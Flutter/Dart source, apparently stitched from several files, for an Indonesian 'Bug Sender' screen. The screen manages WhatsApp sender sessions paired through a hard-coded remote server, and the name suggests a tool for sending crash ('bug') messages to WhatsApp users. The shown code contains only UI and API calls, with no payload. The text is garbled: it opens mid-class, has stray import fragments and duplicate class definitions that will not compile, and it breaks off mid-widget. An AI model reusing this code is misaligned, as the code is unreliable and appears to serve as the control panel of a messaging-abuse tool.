    with SingleTickerProviderStateMixin {
  bool _pressed = false;
  late AnimationController _hoverCtrl;
  late Animation<double> _arrowSlide;

  @override
  void initState() {
    super.initState();
    _hoverCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 200),
    );
    _arrowSlide = Tween<double>(begin: 0, end: 6).animate(
      CurvedAnimation(parent: _hoverCtrl, curve: Curves.easeOut),
    );
  }

  @override
  void dispose() {
    _hoverCtrl.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final c = widget.contact;
    return GestureDetector(
      onTapDown: (_) {
        setState(() => _pressed = true);
        _hoverCtrl.forward();
      },
      onTapUp: (_) {
        setState(() => _pressed = false);
        _hoverCtrl.reverse();
        widget.onTap();
      },
      onTapCancel: () {
        setState(() => _pressed = false);
        _hoverCtrl.reverse();
      },
      child: AnimatedScale(
        scale: _pressed ? 0.97 : 1.0,
        duration: const Duration(milliseconds: 130),
        child: AnimatedContainer(
          duration: const Duration(milliseconds: 180),
          padding: const EdgeInsets.symmetric(horizontal: 18, vertical: 16),
          decoration: BoxDecoration(
            color: _pressed ? _C.card.withOpacity(0.9) : _C.card,
            borderRadius: BorderRadius.circular(18),
            border: Border.all(
              color: _pressed ? c.color.withOpacity(0.3) : _C.border,
            ),
            boxShadow: _pressed
                ? [
                    BoxShadow(
                      color: c.color.withOpacity(0.15),
                      blurRadius: 20,
                      offset: const Offset(0, 4),
                    ),
                  ]
                : [
                    BoxShadow(
                      color: Colors.black.withOpacity(0.2),
                      blurRadius: 10,
                      offset: const Offset(0, 4),
                    ),
                  ],
          ),
          child: Row(
            children: [
              // Icon container
              AnimatedContainer(
                duration: const Duration(milliseconds: 180),
                width: 50, height: 50,
                decoration: BoxDecoration(
                  color: _pressed
                      ? c.color.withOpacity(0.18)
                      : c.colorDim.withOpacity(0.6),
                  borderRadius: BorderRadius.circular(14),
                  border: Border.all(
                    color: c.color.withOpacity(_pressed ? 0.4 : 0.15),
                  ),
                ),
                child: Center(
                  child: FaIcon(c.icon, color: c.color, size: 22),
                ),
              ),

              const SizedBox(width: 16),

              // Label + handle
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      c.label,
                      style: const TextStyle(
                        color: _C.text,
                        fontSize: 15,
                        fontWeight: FontWeight.w700,
                      ),
                    ),
                    const SizedBox(height: 3),
                    Text(
                      c.handle,
                      style: const TextStyle(
                        color: _C.textSub,
                        fontSize: 12,
                      ),
                    ),
                  ],
                ),
              ),

              // Arrow with slide animation
              AnimatedBuilder(
                animation: _arrowSlide,
                builder: (_, __) => Transform.translate(
                  offset: Offset(_arrowSlide.value, 0),
                  child: Container(
                    width: 32, height: 32,
                    decoration: BoxDecoration(
                      color: _pressed
                          ? c.color.withOpacity(0.15)
                          : _C.surface,
                      borderRadius: BorderRadius.circular(9),
                      border: Border.all(
                        color: _pressed
                            ? c.color.withOpacity(0.3)
                            : _C.border,
                      ),
                    ),
                    child: Icon(
                      Icons.arrow_forward_ios_rounded,
                      color: _pressed ? c.color : _C.textSub,
                      size: 14,
                    ),
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}

// ─── Stagger Item ─────────────────────────────────────────────────────────────
class _StaggerItem extends StatelessWidget {
  final int index;
  final Widget child;

  const _StaggerItem({required this.index, required this.child});

  @override
  Widget build(BuildContext context) {
    return TweenAnimationBuilder<double>(
      tween: Tween(begin: 0, end: 1),
      duration: Duration(milliseconds: 500 + index * 100),
      curve: Curves.easeOutCubic,
      builder: (_, v, ch) => Opacity(
        opacity: v,
        child: Transform.translate(offset: Offset(0, 22 * (1 - v)), child: ch),
      ),
      child: child,
    );
  }
}

// ─── Animated Background ──────────────────────────────────────────────────────
class _AnimatedBg extends StatelessWidget {
  final AnimationController controller;
  const _AnimatedBg({required this.controller});

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: controller,
      builder: (_, __) =>
          CustomPaint(painter: _BgPainter(controller.value)),
    );
  }
}

class _BgPainter extends CustomPainter {
  final double t;
  _BgPainter(this.t);

  @override
  void paint(Canvas canvas, Size size) {
    // Grid
    final grid = Paint()
      ..color = _C.border.withOpacity(0.28)
      ..strokeWidth = 0.5;
    const step = 38.0;
    for (double x = 0; x < size.width; x += step) {
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), grid);
    }
    for (double y = 0; y < size.height; y += step) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), grid);
    }

    // Glow
    final glow = Paint()
      ..shader = RadialGradient(
        colors: [
          _C.blue
              .withOpacity(0.10 + math.sin(t * math.pi * 2) * 0.03),
          Colors.transparent,
        ],
        radius: 0.8,
      ).createShader(Rect.fromCircle(
          center: Offset(size.width / 2, size.height * 0.22),
          radius: size.width * 0.65));
    canvas.drawCircle(
        Offset(size.width / 2, size.height * 0.22), size.width * 0.65, glow);
  }

  @override
  bool shouldRepaint(_BgPainter old) => old.t != t;
}

// ─── AppBar Back Button ───────────────────────────────────────────────────────
class _BackBtn extends StatefulWidget {
  final VoidCallback onTap;
  const _BackBtn({required this.onTap});

  @override
  State<_BackBtn> createState() => _BackBtnState();
}

class _BackBtnState extends State<_BackBtn> {
  bool _down = false;

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.all(8),
      child: GestureDetector(
        onTapDown: (_) => setState(() => _down = true),
        onTapUp: (_) {
          setState(() => _down = false);
          widget.onTap();
        },
        onTapCancel: () => setState(() => _down = false),
        child: AnimatedContainer(
          duration: const Duration(milliseconds: 120),
          decoration: BoxDecoration(
            color: _down ? _C.border : _C.surface,
            borderRadius: BorderRadius.circular(11),
            border: Border.all(color: _C.border),
          ),
          child: const Icon(Icons.arrow_back_ios_new_rounded,
              color: _C.textSub, size: 16),
        ),
      ),
    );
  }
}



as math;


as http;


// ─── Palette ──────────────────────────────────────────────────────────────────
// DIUBAH: dari biru ke merah (konsisten dengan dashboard_page)
class _C {
  static const bg         = Color(0xFF060B14);
  static const surface    = Color(0xFF0C1424);
  static const card       = Color(0xFF101A2E);
  static const cardHover  = Color(0xFF152035);
  static const border     = Color(0xFF1A2D4A);
  static const borderLit  = Color(0xFF1E3A5F);

  // WARNA DIUBAH KE MERAH (konsisten dengan dashboard_page)
  static const red        = Color(0xFFBD1B1B);
  static const redMid     = Color(0xFFE82D2D);
  static const redLight   = Color(0xFFF55656);
  static const redFrost   = Color(0xFFF79090);

  static const green      = Color(0xFF22C55E);
  static const greenDim   = Color(0xFF16A34A);
  static const amber      = Color(0xFFF59E0B);

  static const text       = Color(0xFFE2EDF9);
  static const textSub    = Color(0xFF7A9BBF);
  static const textDim    = Color(0xFF3A5470);

  // Gradients diubah ke merah
  static const LinearGradient btnGrad = LinearGradient(
    colors: [redMid, redLight],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );
  static const LinearGradient btnRedGrad = LinearGradient(
    colors: [Color(0xFFDC2626), Color(0xFFEF4444)],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );
}

// ─── Page ─────────────────────────────────────────────────────────────────────
class BugSenderPage extends StatefulWidget {
  final String sessionKey;
  final String username;
  final String role;

  const BugSenderPage({
    super.key,
    required this.sessionKey,
    required this.username,
    required this.role,
  });

  @override
  State<BugSenderPage> createState() => _BugSenderPageState();
}

class _BugSenderPageState extends State<BugSenderPage>
    with TickerProviderStateMixin {
  List<dynamic> senderList = [];
  bool isLoading = false;
  bool isRefreshing = false;
  String? errorMessage;

  // Animasi
  late AnimationController _bgOrbitCtrl;   // orbit ring bg
  late AnimationController _headerCtrl;    // header entrance
  late AnimationController _fabPulseCtrl;  // FAB pulse
  late AnimationController _listCtrl;      // list stagger trigger

  late Animation<double> _headerFade;
  late Animation<Offset> _headerSlide;
  late Animation<double> _fabScale;
  late Animation<double> _fabGlow;

  @override
  void initState() {
    super.initState();

    _bgOrbitCtrl = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 18),
    )..repeat();

    _headerCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 800),
    );
    _headerFade  = CurvedAnimation(parent: _headerCtrl, curve: Curves.easeOut);
    _headerSlide = Tween<Offset>(
      begin: const Offset(0, -0.3),
      end: Offset.zero,
    ).animate(CurvedAnimation(parent: _headerCtrl, curve: Curves.easeOutCubic));

    _fabPulseCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1600),
    )..repeat(reverse: true);
    _fabScale = Tween<double>(begin: 1.0, end: 1.08)
        .animate(CurvedAnimation(parent: _fabPulseCtrl, curve: Curves.easeInOut));
    _fabGlow  = Tween<double>(begin: 0.3, end: 0.7)
        .animate(CurvedAnimation(parent: _fabPulseCtrl, curve: Curves.easeInOut));

    _listCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 100),
    );

    _headerCtrl.forward();
    _fetchSenders();
  }

  @override
  void dispose() {
    _bgOrbitCtrl.dispose();
    _headerCtrl.dispose();
    _fabPulseCtrl.dispose();
    _listCtrl.dispose();
    super.dispose();
  }

  // ─── API ────────────────────────────────────────────────────────────────────
  Future<void> _fetchSenders() async {
    setState(() { isLoading = true; errorMessage = null; });
    try {
      final res = await http.get(
        Uri.parse("http://papi.queen-official.com:2836/mySender?key=${widget.sessionKey}"),
        headers: {'Content-Type': 'application/json'},
      );
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        if (data["valid"] == true) {
          setState(() => senderList = data["connections"] ?? []);
          _listCtrl.forward(from: 0);
        } else {
          setState(() => errorMessage = data["message"] ?? "Failed to fetch");
        }
      } else {
        setState(() => errorMessage = "Server error: ${res.statusCode}");
      }
    } catch (e) {
      setState(() => errorMessage = "Connection failed");
    } finally {
      setState(() { isLoading = false; isRefreshing = false; });
    }
  }

  Future<void> _refreshSenders() async {
    setState(() => isRefreshing = true);
    await _fetchSenders();
  }

  Future<void> _addSender(String number) async {
    setState(() => isLoading = true);
    try {
      final res = await http.get(Uri.parse(
          "http://papi.queen-official.com:2836/getPairing?key=${widget.sessionKey}&number=$number"));
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        if (data["valid"] == true) {
          _showPairingCodeDialog(number, data['pairingCode']);
        } else {
          _toast(data['message'] ?? "Failed to generate pairing code", error: true);
        }
      } else {
        _toast("Server error: ${res.statusCode}", error: true);
      }
    } catch (_) {
      _toast("Connection failed", error: true);
    } finally {
      setState(() => isLoading = false);
      _fetchSenders();
    }
  }

  Future<void> _deleteSender(String senderId) async {
    setState(() => isLoading = true);
    try {
      final res = await http.delete(Uri.parse(
          "http://papi.queen-official.com:2836/deleteSender?key=${widget.sessionKey}&id=$senderId"));
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        if (data["valid"] == true) {
          _toast("Sender deleted successfully");
          _fetchSenders();
        } else {
          _toast(data["message"] ?? "Failed", error: true);
        }
      } else {
        _toast("Server error: ${res.statusCode}", error: true);
      }
    } catch (_) {
      _toast("Connection failed", error: true);
    } finally {
      setState(() => isLoading = false);
    }
  }

  void _toast(String msg, {bool error = false}) {
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      content: Row(children: [
        Icon(error ? Icons.error_outline : Icons.check_circle_outline,
            color: Colors.white, size: 18),
        const SizedBox(width: 10),
        Expanded(child: Text(msg,
            style: const TextStyle(color: Colors.white, fontWeight: FontWeight.w500))),
      ]),
      backgroundColor: error ? _C.red : _C.greenDim,
      behavior: SnackBarBehavior.floating,
      margin: const EdgeInsets.fromLTRB(16, 0, 16, 16),
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
      duration: const Duration(seconds: 3),
    ));
  }

  // ─── Dialogs ────────────────────────────────────────────────────────────────
  void _showAddSenderDialog() {
    final phoneCtrl = TextEditingController();
    showGeneralDialog(
      context: context,
      barrierDismissible: true,
      barrierLabel: '',
      barrierColor: Colors.black87,
      transitionDuration: const Duration(milliseconds: 350),
      transitionBuilder: (_, anim, __, child) => SlideTransition(
        position: Tween<Offset>(
          begin: const Offset(0, 0.15),
          end: Offset.zero,
        ).animate(CurvedAnimation(parent: anim, curve: Curves.easeOutCubic)),
        child: FadeTransition(opacity: anim, child: child),
      ),
      pageBuilder: (ctx, _, __) => Dialog(
        backgroundColor: Colors.transparent,
        insetPadding: const EdgeInsets.symmetric(horizontal: 24),
        child: _DialogShell(
          child: Column(
            mainAxisSize: MainAxisSize.min,
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              // Header
              Row(children: [
                _DialogIcon(icon: Icons.add_link_rounded, color: _C.redMid),
                const SizedBox(width: 14),
                const Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text('Tambah Sender',
                        style: TextStyle(color: _C.text, fontSize: 17,
                            fontWeight: FontWeight.w700)),
                    Text('Masukkan nomor WhatsApp',
                        style: TextStyle(color: _C.textSub, fontSize: 12)),
                  ],
                ),
              ]),
              const SizedBox(height: 24),
              _InputField(
                controller: phoneCtrl,
                label: 'Nomor Telepon',
                hint: '628xxx',
                icon: Icons.phone_outlined,
                keyboardType: TextInputType.phone,
              ),
              const SizedBox(height: 20),
              Row(children: [
                Expanded(child: _OutlineBtn(
                  label: 'Batal',
                  onTap: () => Navigator.pop(ctx),
                )),
                const SizedBox(width: 12),
                Expanded(child: _GradBtn(
                  label: 'Generate Pairing',
                  icon: Icons.link_rounded,
                  onTap: () {
                    final num = phoneCtrl.text.trim();
                    if (num.isEmpty) {
                      _toast('Masukkan nomor telepon', error: true);
                      return;
                    }
                    Navigator.pop(ctx);
                    _addSender(num);
                  },
                )),
              ]),
            ],
          ),
        ),
      ),
    );
  }

  void _showPairingCodeDialog(String number, String code) {
    showGeneralDialog(
      context: context,
      barrierDismissible: false,
      barrierLabel: '',
      barrierColor: Colors.black87,
      transitionDuration: const Duration(milliseconds: 400),
      transitionBuilder: (_, anim, __, child) => ScaleTransition(
        scale: CurvedAnimation(parent: anim, curve: Curves.easeOutBack),
        child: FadeTransition(opacity: anim, child: child),
      ),
      pageBuilder: (ctx, _, __) => Dialog(
        backgroundColor: Colors.transparent,
        insetPadding: const EdgeInsets.symmetric(horizontal: 20),
        child: _PairingDialog(
          number: number,
          code: code,
          onClose: () {
            Navigator.pop(ctx);
            _fetchSenders();
          },
        ),
      ),
    );
  }

  Future<void> _showDeleteConfirm(Map<String, dynamic> sender) async {
    final confirmed = await showGeneralDialog<bool>(
      context: context,
      barrierDismissible: true,
      barrierLabel: '',
      barrierColor: Colors.black87,
      transitionDuration: const Duration(milliseconds: 280),
      transitionBuilder: (_, anim, __, child) => ScaleTransition(
        scale: CurvedAnimation(parent: anim, curve: Curves.easeOutBack),
        child: FadeTransition(opacity: anim, child: child),
      ),
      pageBuilder: (ctx, _, __) => Dialog(
        backgroundColor: Colors.transparent,
        insetPadding: const EdgeInsets.symmetric(horizontal: 24),
        child: _DialogShell(
          accentColor: _C.red,
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              _DialogIcon(icon: Icons.delete_forever_rounded, color: _C.red),
              const SizedBox(height: 16),
              const Text('Hapus Sender?',
                  style: TextStyle(color: _C.text, fontSize: 18,
                      fontWeight: FontWeight.w700)),
              const SizedBox(height: 10),
              Text(
                "Sender '${sender['sessionName'] ?? sender['id']}' akan dihapus permanen.",
                textAlign: TextAlign.center,
                style: const TextStyle(color: _C.textSub, fontSize: 13, height: 1.5),
              ),
              const SizedBox(height: 24),
              Row(children: [
                Expanded(child: _OutlineBtn(
                  label: 'Batal',
                  onTap: () => Navigator.pop(ctx, false),
                )),
                const SizedBox(width: 12),
                Expanded(child: _GradBtn(
                  label: 'Hapus',
                  icon: Icons.delete_outline_rounded,
                  gradient: _C.btnRedGrad,
                  onTap: () => Navigator.pop(ctx, true),
                )),
              ]),
            ],
          ),
        ),
      ),
    );
    if (confirmed == true) _deleteSender(sender['id']);
  }

  // ─── Widgets ─────────────────────────────────────────────────────────────────
  Widget _buildSenderCard(Map<String, dynamic> sender, int index) {
    final name    = sender['sessionName'] ?? 'WhatsApp Sender';
    final isConn  = true; // placeholder — bisa pakai field status dari API

    return _StaggerItem(
      index: index,
      child: _SenderCard(
        name: name,
        isConnected: isConn,
        onRefresh: _refreshSenders,
        onDelete: () => _showDeleteConfirm(sender),
      ),
    );
  }

  Widget _buildEmptyState() {
    return _EmptyState(onAdd: _showAddSenderDialog);
  }

  Widget _buildErrorState() {
    return _ErrorState(
      message: errorMessage ?? 'Unknown error',
      onRetry: _fetchSenders,
    );
  }

  Widget _buildLoading() {
    return const Center(child: _DotsLoader());
  }

  // ─── Build ────────────────────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _C.bg,
      extendBodyBehindAppBar: true,
      appBar: _buildAppBar(),
      body: Stack(
        children: [
          // Animated background
          Positioned.fill(child: _AnimatedBg(controller: _bgOrbitCtrl)),

          // Content
          SafeArea(
            child: _buildBody(),
          ),

          // Loading overlay (subtle)
          if (isLoading && senderList.isNotEmpty)
            Positioned(
              top: kToolbarHeight + MediaQuery.of(context).padding.top + 12,
              left: 0, right: 0,
              child: const Center(child: _ThinProgress()),
            ),
        ],
      ),
      floatingActionButton: _buildFAB(),
    );
  }

  PreferredSizeWidget _buildAppBar() {
    return AppBar(
      backgroundColor: Colors.transparent,
      elevation: 0,
      leading: _AppBarBtn(
        icon: Icons.arrow_back_ios_new_rounded,
        onTap: () => Navigator.pop(context),
      ),
      title: FadeTransition(
        opacity: _headerFade,
        child: SlideTransition(
          position: _headerSlide,
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              const Text('Bug Sender',
                  style: TextStyle(
                    color: _C.text,
                    fontSize: 18,
                    fontWeight: FontWeight.w700,
                    letterSpacing: -0.3,
                  )),
              Text('${senderList.length} sender aktif',
                  style: const TextStyle(color: _C.textSub, fontSize: 11)),
            ],
          ),
        ),
      ),
      actions: [
        _AppBarBtn(
          icon: Icons.refresh_rounded,
          onTap: isLoading ? null : _refreshSenders,
          spinning: isRefreshing,
        ),
        const SizedBox(width: 8),
      ],
    );
  }

  Widget _buildBody() {
    if (isLoading && senderList.isEmpty) return _buildLoading();
    if (errorMessage != null && senderList.isEmpty) return _buildErrorState();
    if (senderList.isEmpty) return _buildEmptyState();

    return RefreshIndicator(
      color: _C.redMid,
      backgroundColor: _C.card,
      onRefresh: _refreshSenders,
      child: CustomScrollView(
        physics: const BouncingScrollPhysics(
            parent: AlwaysScrollableScrollPhysics()),
        slivers: [
          // Stat strip
          SliverToBoxAdapter(
            child: Padding(
              padding: const EdgeInsets.fromLTRB(16, 12, 16, 4),
              child: _StatStrip(total: senderList.length),
            ),
          ),
          // Cards
          SliverPadding(
            padding: const EdgeInsets.fromLTRB(16, 8, 16, 100),
            sliver: SliverList(
              delegate: SliverChildBuilderDelegate(
                (ctx, i) => _buildSenderCard(
                    Map<String, dynamic>.from(senderList[i]), i),
                childCount: senderList.length,
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildFAB() {
    return AnimatedBuilder(
      animation: _fabPulseCtrl,
      builder: (_, child) => Transform.scale(
        scale: _fabScale.value,
        child: Container(
          width: 58,
          height: 58,
          decoration: BoxDecoration(
            gradient: _C.btnGrad,
            shape: BoxShape.circle,
            boxShadow: [
              BoxShadow(
                color: _C.redMid.withOpacity(_fabGlow.value),
                blurRadius: 28,
                spreadRadius: 0,
              ),
            ],
          ),
          child: Material(
            color: Colors.transparent,
            shape: const CircleBorder(),
            child: InkWell(
              customBorder: const CircleBorder(),
              splashColor: Colors.white24,
              onTap: _showAddSenderDialog,
              child: const Icon(Icons.add_rounded, color: Colors.white, size: 28),
            ),
          ),
        ),
      ),
    );
  }
}

// ─── Animated Background ──────────────────────────────────────────────────────
class _AnimatedBg extends StatelessWidget {
  final AnimationController controller;
  const _AnimatedBg({required this.controller});

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: controller,
      builder: (_, __) => CustomPaint(
        painter: _BgPainter(controller.value),
      ),
    );
  }
}

class _BgPainter extends CustomPainter {
  final double t;
  _BgPainter(this.t);

  @override
  void paint(Canvas canvas, Size size) {
    // Grid
    final gridPaint = Paint()
      ..color = _C.border.withOpacity(0.35)
      ..strokeWidth = 0.5;
    const step = 38.0;
    for (double x = 0; x < size.width; x += step) {
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), gridPaint);
    }
    for (double y = 0; y < size.height; y += step) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), gridPaint);
    }

    // Slow orbit glow circles (DIUBAH: dari biru ke merah)
    final cx = size.width * 0.5;
    final cy = size.height * 0.18;

    for (int i = 0; i < 3; i++) {
      final angle = (t * math.pi * 2) + (i * math.pi * 2 / 3);
      final r = 80.0 + i * 55.0;
      final ox = cx + math.cos(angle) * r * 0.3;
      final oy = cy + math.sin(angle) * r * 0.15;

      final paint = Paint()
        ..shader = RadialGradient(
          colors: [
            _C.red.withOpacity(0.07 - i * 0.015),
            Colors.transparent,
          ],
        ).createShader(Rect.fromCircle(center: Offset(ox, oy), radius: r));
      canvas.drawCircle(Offset(ox, oy), r, paint);
    }

    // Top vignette
    final vigPaint = Paint()
      ..shader = const LinearGradient(
        begin: Alignment.topCenter,
        end: Alignment.bottomCenter,
        colors: [Color(0xFF060B14), Colors.transparent],
        stops: [0.0, 1.0],
      ).createShader(Rect.fromLTWH(0, 0, size.width, size.height * 0.4));
    canvas.drawRect(
        Rect.fromLTWH(0, 0, size.width, size.height * 0.4), vigPaint);
  }

  @override
  bool shouldRepaint(_BgPainter old) => old.t != t;
}

// ─── Sender Card ─────────────────────────────────────────────────────────────
class _SenderCard extends StatefulWidget {
  final String name;
  final bool isConnected;
  final VoidCallback onRefresh;
  final VoidCallback onDelete;

  const _SenderCard({
    required this.name,
    required this.isConnected,
    required this.onRefresh,
    required this.onDelete,
  });

  @override
  State<_SenderCard> createState() => _SenderCardState();
}

class _SenderCardState extends State<_SenderCard>
    with SingleTickerProviderStateMixin {
  late AnimationController _pulse;
  late Animation<double> _dot;

  @override
  void initState() {
    super.initState();
    _pulse = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1400),
    )..repeat(reverse: true);
    _dot = Tween<double>(begin: 0.5, end: 1.0)
        .animate(CurvedAnimation(parent: _pulse, curve: Curves.easeInOut));
  }

  @override
  void dispose() {
    _pulse.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Container(
      margin: const EdgeInsets.only(bottom: 14),
      decoration: BoxDecoration(
        color: _C.card,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: _C.border),
        boxShadow: [
          BoxShadow(
            color: _C.red.withOpacity(0.07),
            blurRadius: 24,
            offset: const Offset(0, 8),
          ),
        ],
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(20),
        child: Column(
          children: [
            // Top accent line (DIUBAH: dari biru ke merah)
            Container(
              height: 2,
              decoration: const BoxDecoration(
                gradient: LinearGradient(
                  colors: [Colors.transparent, _C.redMid, Colors.transparent],
                ),
              ),
            ),
            Padding(
              padding: const EdgeInsets.fromLTRB(18, 18, 18, 18),
              child: Column(
                children: [
                  // Row 1: avatar + info + status
                  Row(
                    children: [
                      // WhatsApp-style avatar (DIUBAH: dari biru ke merah)
                      Container(
                        width: 50,
                        height: 50,
                        decoration: BoxDecoration(
                          color: _C.red.withOpacity(0.12),
                          borderRadius: BorderRadius.circular(15),
                          border: Border.all(color: _C.borderLit),
                        ),
                        child: Stack(
                          children: [
                            const Center(
                              child: Icon(FontAwesomeIcons.whatsapp,
                                  color: _C.redLight, size: 24),
                            ),
                            // Online dot
                            Positioned(
                              right: 5, bottom: 5,
                              child: AnimatedBuilder(
                                animation: _dot,
                                builder: (_, __) => Container(
                                  width: 10, height: 10,
                                  decoration: BoxDecoration(
                                    shape: BoxShape.circle,
                                    color: widget.isConnected
                                        ? _C.green.withOpacity(_dot.value)
                                        : _C.red,
                                    boxShadow: widget.isConnected
                                        ? [BoxShadow(
                                            color: _C.green.withOpacity(
                                                _dot.value * 0.6),
                                            blurRadius: 6,
                                          )]
                                        : null,
                                  ),
                                ),
                              ),
                            ),
                          ],
                        ),
                      ),
                      const SizedBox(width: 14),
                      // Name + status
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text(widget.name,
                                style: const TextStyle(
                                    color: _C.text,
                                    fontSize: 15,
                                    fontWeight: FontWeight.w700)),
                            const SizedBox(height: 4),
                            Row(children: [
                              AnimatedBuilder(
                                animation: _dot,
                                builder: (_, __) => Container(
                                  width: 6, height: 6,
                                  decoration: BoxDecoration(
                                    shape: BoxShape.circle,
                                    color: widget.isConnected
                                        ? _C.green.withOpacity(_dot.value)
                                        : _C.red,
                                  ),
                                ),
                              ),
                              const SizedBox(width: 6),
                              Text(
                                widget.isConnected ? 'Connected' : 'Disconnected',
                                style: TextStyle(
                                  color: widget.isConnected
                                      ? _C.green
                                      : _C.red,
                                  fontSize: 12,
                                  fontWeight: FontWeight.w500,
                                ),
                              ),
                            ]),
                          ],
                        ),
                      ),
                      // Status badge
                      Container(
                        padding: const EdgeInsets.symmetric(
                            horizontal: 10, vertical: 5),
                        decoration: BoxDecoration(
                          color: widget.isConnected
                              ? _C.green.withOpacity(0.1)
                              : _C.red.withOpacity(0.1),
                          borderRadius: BorderRadius.circular(8),
                          border: Border.all(
                            color: widget.isConnected
                                ? _C.green.withOpacity(0.3)
                                : _C.red.withOpacity(0.3),
                          ),
                        ),
                        child: Text(
                          widget.isConnected ? 'ACTIVE' : 'OFFLINE',
                          style: TextStyle(
                            color: widget.isConnected ? _C.green : _C.red,
                            fontSize: 10,
                            fontWeight: FontWeight.w700,
                            letterSpacing: 0.8,
                          ),
                        ),
                      ),
                    ],
                  ),

                  const SizedBox(height: 18),

                  // Divider
                  Container(
                    height: 1,
                    color: _C.border,
                  ),

                  const SizedBox(height: 14),

                  // Action buttons
                  Row(children: [
                    Expanded(
                      child: _CardBtn(
                        label: 'Refresh',
                        icon: Icons.refresh_rounded,
                        onTap: widget.onRefresh,
                      ),
                    ),
                    const SizedBox(width: 10),
                    Expanded(
                      child: _CardBtn(
                        label: 'Hapus',
                        icon: Icons.delete_outline_rounded,
                        isDestructive: true,
                        onTap: widget.onDelete,
                      ),
                    ),
                  ]),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ─── Card Button ──────────────────────────────────────────────────────────────
class _CardBtn extends StatefulWidget {
  final String label;
  final IconData icon;
  final bool isDestructive;
  final VoidCallback onTap;

  const _CardBtn({
    required this.label,
    required this.icon,
    required this.onTap,
    this.isDestructive = false,
  });

  @override
  State<_CardBtn> createState() => _CardBtnState();
}

class _CardBtnState extends State<_CardBtn> {
  bool _pressed = false;

  @override
  Widget build(BuildContext context) {
    final color = widget.isDestructive ? _C.red : _C.redLight;

    return GestureDetector(
      onTapDown: (_) => setState(() => _pressed = true),
      onTapUp: (_) { setState(() => _pressed = false); widget.onTap(); },
      onTapCancel: () => setState(() => _pressed = false),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 130),
        height: 42,
        decoration: BoxDecoration(
          color: _pressed
              ? color.withOpacity(0.15)
              : color.withOpacity(0.06),
          borderRadius: BorderRadius.circular(12),
          border: Border.all(
            color: _pressed
                ? color.withOpacity(0.5)
                : color.withOpacity(0.2),
          ),
        ),
        child: AnimatedScale(
          scale: _pressed ? 0.95 : 1.0,
          duration: const Duration(milliseconds: 130),
          child: Row(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Icon(widget.icon, color: color, size: 16),
              const SizedBox(width: 6),
              Text(widget.label,
                  style: TextStyle(
                    color: color,
                    fontSize: 13,
                    fontWeight: FontWeight.w600,
                  )),
            ],
          ),
        ),
      ),
    );
  }
}

// ─── Pairing Code Dialog (premium) ────────────────────────────────────────────
class _PairingDialog extends StatefulWidget {
  final String number;
  final String code;
  final VoidCallback onClose;

  const _PairingDialog({
    required this.number,
    required this.code,
    required this.onClose,
  });

  @override
  State<_PairingDialog> createState() => _PairingDialogState();
}

class _PairingDialogState extends State<_PairingDialog>
    with SingleTickerProviderStateMixin {
  late AnimationController _glowCtrl;
  late Animation<double> _glow;
  bool _copied = false;

  @override
  void initState() {
    super.initState();
    _glowCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1800),
    )..repeat(reverse: true);
    _glow = Tween<double>(begin: 0.3, end: 0.9)
        .animate(CurvedAnimation(parent: _glowCtrl, curve: Curves.easeInOut));
  }

  @override
  void dispose() {
    _glowCtrl.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return _DialogShell(
      child: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          // Icon area (DIUBAH: dari biru ke merah)
          AnimatedBuilder(
            animation: _glow,
            builder: (_, __) => Container(
              width: 64,
              height: 64,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                color: _C.red.withOpacity(0.12),
                boxShadow: [
                  BoxShadow(
                    color: _C.redMid.withOpacity(_glow.value * 0.4),
                    blurRadius: 30,
                    spreadRadius: 0,
                  ),
                ],
                border: Border.all(
                    color: _C.redMid.withOpacity(_glow.value * 0.5)),
              ),
              child: const Icon(Icons.phonelink_lock_rounded,
                  color: _C.redLight, size: 28),
            ),
          ),
          const SizedBox(height: 16),
          const Text('Kode Pairing',
              style: TextStyle(
                  color: _C.text,
                  fontSize: 20,
                  fontWeight: FontWeight.w800)),
          const SizedBox(height: 6),
          Text('Nomor: ${widget.number}',
              style: const TextStyle(color: _C.textSub, fontSize: 13)),

          const SizedBox(height: 24),

          // Code box (DIUBAH: dari biru ke merah)
          AnimatedBuilder(
            animation: _glow,
            builder: (_, __) => Container(
              width: double.infinity,
